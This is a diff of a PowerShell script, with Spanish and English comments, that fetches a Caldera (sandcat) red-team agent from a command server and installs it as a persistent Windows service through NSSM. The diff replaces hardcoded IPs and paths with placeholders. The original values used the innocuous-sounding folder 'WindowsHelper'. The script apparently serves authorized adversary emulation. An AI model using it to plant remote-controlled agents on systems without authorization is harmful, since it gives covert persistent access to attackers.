@@ -1,13 +1,13 @@
 ﻿# --- CONFIGURACIÓN ---
-$agentUrl = "http://10.111.8.251:8888/file/download"
+$agentUrl = "http:/<YOUR_CALDERA_IP>/file/download"
 $agentFilename = "caldera-agent.exe"
-$installPath = "C:\ProgramData\WindowsHelper"
+$installPath = <PATH_TO_INSTALL_CALDERA_AGENT>
 $nssmUrl = "https://nssm.cc/release/nssm-2.24.zip"
 $nssmZip = "$env:TEMP\nssm.zip"
-$nssmPath = "C:\nssm"
-$serviceName = "RunCalderaAgent"
+$nssmPath = <PATH_FOR_NSSM>
+$serviceName = <NAME_FOR_THE_SERVICE>
 # -- SET THE GROUP TO WHICH THE AGENT WILL BE ASSIGNED. (CLIENT NAME) --
-$agentArgs = "-server http://10.111.8.251:8888 -group red"
+$agentArgs = "-server http://<YOUR_CALDERA_IP>:<PORT> -group red"
 
 # -- IT IS NECESSARY TO DOWNLOAD NSSM TO WRAP THE AGENT INTO A SERVICE --
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -29,7 +29,7 @@ try {
 # --- 2. DOWNLOAD THE AGENT---
 
 try {
-    Invoke-WebRequest -Uri "http://10.111.8.251:8888/file/download" `
+    Invoke-WebRequest -Uri "$agentUrl" `
       -Headers @{platform="windows"; file="sandcat.go"} `
       -OutFile "$installPath\$agentFilename"	
 	Write-Host "✅ Agente descargado como $agentFilename"
